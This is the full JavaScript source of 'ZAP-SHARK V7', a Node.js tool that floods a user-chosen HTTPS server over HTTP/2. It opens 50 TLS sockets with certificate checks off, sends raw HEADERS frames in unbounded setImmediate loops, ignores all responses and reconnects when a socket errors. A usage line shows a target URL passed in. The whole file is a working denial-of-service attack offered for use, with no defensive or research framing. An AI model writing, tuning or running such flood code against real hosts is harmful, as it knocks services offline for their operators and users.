const net = require('net');
const tls = require('tls');

class ZAPSHARK_V7 {
    constructor(targetUrl) {
        const url = new URL(targetUrl);
        this.host = url.hostname;
        this.port = url.port || 443;
        this.path = url.pathname || '/';
        
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        
        // === RAW H2 PRE-COMPUTED FRAMES ===
        // Minimal HTTP/2 connection preface
        this.PREFACE = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'utf8');
        
        // SETTINGS frame (empty)
        this.SETTINGS_FRAME = Buffer.from([
            0x00, 0x00, 0x00,       // Length: 0
            0x04,                   // Type: SETTINGS
            0x00,                   // Flags: none
            0x00, 0x00, 0x00, 0x00  // Stream ID: 0
        ]);
        
        // SETTINGS ACK
        this.SETTINGS_ACK = Buffer.from([
            0x00, 0x00, 0x00,       // Length: 0
            0x04,                   // Type: SETTINGS
            0x01,                   // Flags: ACK
            0x00, 0x00, 0x00, 0x00  // Stream ID: 0
        ]);
        
        // WINDOW_UPDATE for connection
        this.WINDOW_UPDATE = Buffer.from([
            0x00, 0x00, 0x04,       // Length: 4
            0x08,                   // Type: WINDOW_UPDATE
            0x00,                   // Flags: none
            0x00, 0x00, 0x00, 0x00, // Stream ID: 0
            0x00, 0x01, 0x00, 0x00  // Increment: 65535
        ]);
        
        // === PRE-ALLOCATED REQUEST BUFFERS ===
        this.requestBuffers = new Array(1000);
        for (let i = 0; i < 1000; i++) {
            this.requestBuffers[i] = this.createRequestBuffer(i + 1);
        }
        this.bufferIndex = 0;
        
        // === RAW SOCKETS ===
        this.sockets = new Array(50); // 50 raw sockets
        this.socketIndex = 0;
        this.connectedSockets = 0;
        
        // === SETIMMEDIATE FLOOD ===
        this.floodActive = false;
        
        // === NO ERROR HANDLING ===
        // (Literally none - let it crash)
    }
    
    // === CREATE 1-BYTE REQUEST BUFFER ===
    createRequestBuffer(streamId) {
        // HEADERS frame with minimum possible data
        const buffer = Buffer.alloc(9 + 1); // 9 byte header + 1 byte payload
        
        // Frame header
        buffer.writeUIntBE(1, 0, 3);        // Length: 1 byte
        buffer[3] = 0x01;                   // Type: HEADERS
        buffer[4] = 0x04;                   // Flags: END_HEADERS | END_STREAM
        buffer.writeUInt32BE(streamId, 5);  // Stream ID
        
        // 1 byte of header data (minimal HPACK)
        buffer[9] = 0x00;                   // Literal header field with indexing - never indexed
        
        return buffer;
    }
    
    // === RAW TLS SOCKET ===
    createRawSocket() {
        const socket = tls.connect({
            host: this.host,
            port: this.port,
            rejectUnauthorized: false,
            enableTrace: false,
            ciphers: 'TLS_AES_128_GCM_SHA256' // Fastest cipher
        });
        
        socket.setNoDelay(true);
        socket.setKeepAlive(false);
        socket.setTimeout(0);
        
        // === NO ERROR HANDLING ===
        socket.on('secureConnect', () => {
            this.connectedSockets++;
            
            // Send HTTP/2 preface immediately
            socket.write(this.PREFACE);
            socket.write(this.SETTINGS_FRAME);
            socket.write(this.WINDOW_UPDATE);
            
            // Start flooding this socket
            this.floodSocket(socket);
        });
        
        socket.on('data', () => {
            // IGNORE ALL RESPONSES - WE DON'T CARE
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        });
        
        socket.on('error', () => {
            this.connectedSockets--;
            // NO RECONNECT - JUST CREATE NEW ONE
            setTimeout(() => this.createRawSocket(), 100);
        });
        
        return socket;
    }
    
    // === SOCKET FLOOD ===
    floodSocket(socket) {
        // Use setImmediate for maximum speed
        const flood = () => {
            if (socket.destroyed) return;
            
            // Send 1000 requests in one go
            for (let i = 0; i < 1000; i++) {
                socket.write(this.requestBuffers[this.bufferIndex]);
                this.bufferIndex = (this.bufferIndex + 1) % 1000;
            }
            
            // IMMEDIATELY SCHEDULE NEXT BATCH
            setImmediate(flood);
        };
        
        setImmediate(flood);
    }
    
    // === SETIMMEDIATE FLOOD SYSTEM ===
    startFlood() {
        if (this.floodActive) return;
        this.floodActive = true;
        
        const floodLoop = () => {
            // Create more sockets if needed
            if (this.connectedSockets < 50) {
                for (let i = this.connectedSockets; i < 50; i++) {
                    this.sockets[i] = this.createRawSocket();
                }
            }
            
            // KEEP CPU AT 100%
            setImmediate(floodLoop);
        };
        
        // START 10 PARALLEL FLOOD LOOPS
        for (let i = 0; i < 10; i++) {
            setImmediate(floodLoop);
        }
    }
    
    // === STATS (MINIMAL) ===
    updateStats() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
            
            // UPDATE DISPLAY
            this.updateDisplay();
        }
    }
    
    updateDisplay() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK V7 | RAW H2`);
        console.log('============================');
        console.log(`TRS — ${this.totalRequests.toLocaleString()}`);
        console.log(`RPS — ${this.currentRPS.toFixed(0)}`);
        console.log('============================');
        console.log(`SOCKETS: ${this.connectedSockets}/50`);
        console.log(`RUNTIME: ${runtimeStr}`);
        console.log('============================');
    }
    
    // === START ===
    start() {
        console.log('=== ZAP-SHARK V7 - RAW H2 ===');
        console.log('Host:', this.host);
        console.log('Mode: 1-BYTE REQUESTS | RAW SOCKETS');
        console.log('Sockets: 50 | Pre-allocated buffers');
        console.log('='.repeat(50));
        
        // Create initial sockets
        for (let i = 0; i < 10; i++) {
            setTimeout(() => {
                this.sockets[i] = this.createRawSocket();
            }, i * 10);
        }
        
        // Start flood
        setTimeout(() => {
            this.startFlood();
        }, 2000);
        
        // Stats update
        setInterval(() => {
            this.updateStats();
        }, 100);
        
        // NO CLEANUP ON EXIT - JUST KILL PROCESS
        process.on('SIGINT', () => {
            console.log('\n=== V7 STOPPED ===');
            console.log(`Total: ${this.totalRequests.toLocaleString()} requests`);
            process.exit(0);
        });
    }
}

// === USAGE ===
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v7.js https://target.com');
    process.exit(1);
}

// REMOVE ALL NODE LIMITS
process.env.UV_THREADPOOL_SIZE = 128;
require('v8').setFlagsFromString('--max-old-space-size=8192');

const shark = new ZAPSHARK_V7(target);
shark.start();
